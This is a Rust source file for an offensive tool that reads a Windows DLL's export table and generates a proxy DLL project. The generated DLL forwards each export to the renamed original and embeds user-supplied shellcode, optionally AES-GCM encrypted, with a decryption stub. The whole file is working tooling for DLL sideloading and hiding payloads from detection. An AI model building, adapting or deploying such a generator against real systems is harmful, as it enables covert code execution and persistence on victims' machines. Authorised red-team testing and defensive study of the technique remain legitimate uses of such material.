use aes_gcm::{
    aead::{AeadCore, AeadMutInPlace, KeyInit, OsRng},
    Aes256Gcm,
};
use clap::Parser;
use std::fs;
use std::fs::File;
use std::io::Write;
use std::str;

mod winpe;

#[derive(Default)]
struct EncArgs {
    pub key: [u8; 32],
    pub nonce: [u8; 12],
}

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    #[arg(short, long)]
    pub dll: std::path::PathBuf,
    #[arg(short, long)]
    pub shellcode: Option<std::path::PathBuf>,
    #[arg(short, long)]
    pub output: Option<std::path::PathBuf>,
    #[arg(short, long)]
    pub resources: Option<std::path::PathBuf>,
    #[arg(short, long)]
    pub encryption: Option<String>,
}

fn join_vec(nums: &[u8], sep: &str) -> String {
    nums.iter()
        .map(|n| n.to_string())
        .collect::<Vec<_>>()
        .join(sep)
}

fn load_resource_file(resource_path: &mut std::path::PathBuf, filename: &str) -> std::io::Result<String> {
    resource_path.push(filename);
    let content = fs::read_to_string(&resource_path)?;
    resource_path.pop();
    Ok(content)
}

fn write_output_file(output_path: &mut std::path::PathBuf, filename: &str, content: &[u8]) -> std::io::Result<()> {
    output_path.push(filename);
    let mut file = File::create(&output_path)?;
    file.write_all(content)?;
    println!("Wrote {} to {:?}", filename, output_path);
    output_path.pop();
    Ok(())
}

fn encrypt_aes(shellcode: &mut Vec<u8>) -> EncArgs {
    let key = Aes256Gcm::generate_key(OsRng);
    let mut cipher = Aes256Gcm::new(&key);
    let nonce = Aes256Gcm::generate_nonce(&mut OsRng);
    cipher
        .encrypt_in_place(&nonce, b"", shellcode)
        .expect("Could not encrypt shellcode");
    EncArgs {
        key: key.as_slice().try_into().expect("Key did not fit"),
        nonce: nonce.as_slice().try_into().expect("Nonce did not fit"),
    }
}

fn get_encryption_algo(
    encryption: &Option<String>,
    shellcode: &mut Vec<u8>,
    resource_path: &mut std::path::PathBuf,
) -> std::io::Result<String> {
    if let Some(encryption_type) = encryption {
        if encryption_type.to_lowercase() == "aes" {
            println!("Using AES encryption");
            let enc_algo_template = load_resource_file(resource_path, "aes.rs")?;
            let encryption_args = encrypt_aes(shellcode);
            Ok(enc_algo_template
                .replace("{KEY}", join_vec(&encryption_args.key, ",").as_str())
                .replace("{NONCE}", join_vec(&encryption_args.nonce, ",").as_str()))
        } else {
            panic!("Unknown encryption algorithm");
        }
    } else {
        println!("No encryption defined - embedding plain shellcode");
        Ok(String::from("let dec_shellcode = shellcode::SHELLCODE.to_vec();"))
    }
}

fn main() -> std::io::Result<()> {
    let args = Args::parse();
    println!("Proxying {:?}", args.dll);

    let mut shellcode = match &args.shellcode {
        Some(shellcode_path) => {
            println!("Embedding shellcode {:?}", shellcode_path);
            fs::read(shellcode_path).expect("Could not read shellcode file")
        }
        None => {
            println!("No shellcode argument given - skipping");
            Vec::new()
        }
    };

    let mut output = args.output.unwrap_or_else(|| std::path::PathBuf::from("output"));
    let mut resource_path = args.resources.unwrap_or_else(|| std::path::PathBuf::from(".\\."));

    let dll_data = fs::read(&args.dll).expect("Could not read dll file");

    let dll_name = args.dll.file_stem().unwrap().to_str().unwrap();

    let pe_file = winpe::parse(dll_data);
    if pe_file.x64 {
        println!("Parsed an x64 PE file");
    } else {
        println!("Parsed an x86 PE file");
    }

    let export_table = pe_file.export_table;
    println!(
        "Found {} exported functions",
        export_table.array_of_names.len()
    );

    let function_exports = export_table
        .array_of_names
        .iter()
        .zip(export_table.array_of_ordinals.iter())
        .map(|(name, ordinal)| {
            format!(
                "    .section .drectve\n    .asciz \"-export:{}={}_orig.{},@{}\"\n",
                name, dll_name, name, ordinal
            )
        })
        .collect::<String>();

    let export_asm_template = load_resource_file(&mut resource_path, "export.rs")?;
    let export_asm = export_asm_template.replace("{}", function_exports.as_str());

    let template_content = load_resource_file(&mut resource_path, "template.rs")?;

    fs::create_dir(&output)?;

    let mut shellcode_stub_template = String::new();
    if !shellcode.is_empty() {
        let encryption_algo = get_encryption_algo(&args.encryption, &mut shellcode, &mut resource_path)?;

        let shellcode_template = load_resource_file(&mut resource_path, "shellcode_template.rs")?;
        let shellcode_str = join_vec(&shellcode, ",");

        let shellcode_output = shellcode_template
            .replace("{SIZE}", &shellcode.len().to_string())
            .replace("{SHELLCODE}", &shellcode_str);

        write_output_file(&mut output, "shellcode.rs", shellcode_output.as_bytes())?;

        shellcode_stub_template = load_resource_file(&mut resource_path, "shellcode_stub.rs")?;
        shellcode_stub_template = shellcode_stub_template.replace("{ENC}", &encryption_algo);
    }

    let proxy_output = template_content
        .replace("{}", &export_asm)
        .replace("{SHELLCODE_STUB}", &shellcode_stub_template);
    write_output_file(&mut output, "proxy.rs", proxy_output.as_bytes())?;

    // Copy build files from resources
    output.push("build.rs");
    resource_path.push("build.rs");
    fs::copy(&resource_path, &output).expect("Could not create build.rs");
    output.pop();
    resource_path.pop();

    output.push("Cargo.toml");
    resource_path.push("Cargo.toml");
    fs::copy(&resource_path, &output).expect("Could not create Cargo.toml");

    Ok(())
}
